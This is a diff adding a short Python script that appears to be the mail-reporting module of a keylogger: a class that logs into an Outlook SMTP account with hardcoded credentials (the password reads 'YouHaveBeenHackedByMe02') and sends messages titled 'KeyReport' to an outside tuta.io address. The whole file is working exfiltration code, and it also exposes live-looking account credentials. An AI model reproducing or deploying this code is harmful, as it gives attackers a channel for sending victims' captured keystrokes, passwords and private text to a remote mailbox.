@@ -1,0 +1,49 @@
+# -*- coding: utf-8 -*-
+"""
+Spyder Editor
+
+This is a temporary script file.
+"""
+
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+class mailSender:
+    def __init__(self):
+        self.sender = "user93321245@outlook.com"
+        self.password = "YouHaveBeenHackedByMe02"
+        
+        self.to = "yed3926@tuta.io" 
+        
+        self.subject = "KeyReport"
+        
+        self.smtpObj = smtplib.SMTP("smtp-mail.outlook.com" , 587)
+        self.smtpObj.ehlo()
+        self.smtpObj.starttls()
+        self.smtpObj.ehlo()
+        self.smtpObj.login(self.sender , self.password)
+        self.message = None
+        
+    def sendMail(self , msg ):
+        #message = """From: %s\r\nTo: %s\r\nSubject: %s\r\n\%s""" % (self.sender, ", ".join(self.to), self.subject, msg)
+        #message = """From : {}\r\nTo: {}\r\nSubject: {}\r\n {}""".format(self.sender , self.to , self.subject , msg)
+        """
+        message = MIMEText(msg)
+        msg['Subject'] = self.subject
+        msg["From"] = self.sender
+        msg["To"] = self.to 
+        """
+        
+        message = MIMEMultipart()
+        message['From'] = self.sender
+        message['To'] = self.to
+        message['Subject'] = self.subject
+        message.attach(MIMEText(msg))
+        
+        
+        self.smtpObj.sendmail(self.sender ,  self.to , message.as_string()  )
+    
+    def deconnect(self):
+        self.smtpObj.quit()
+        
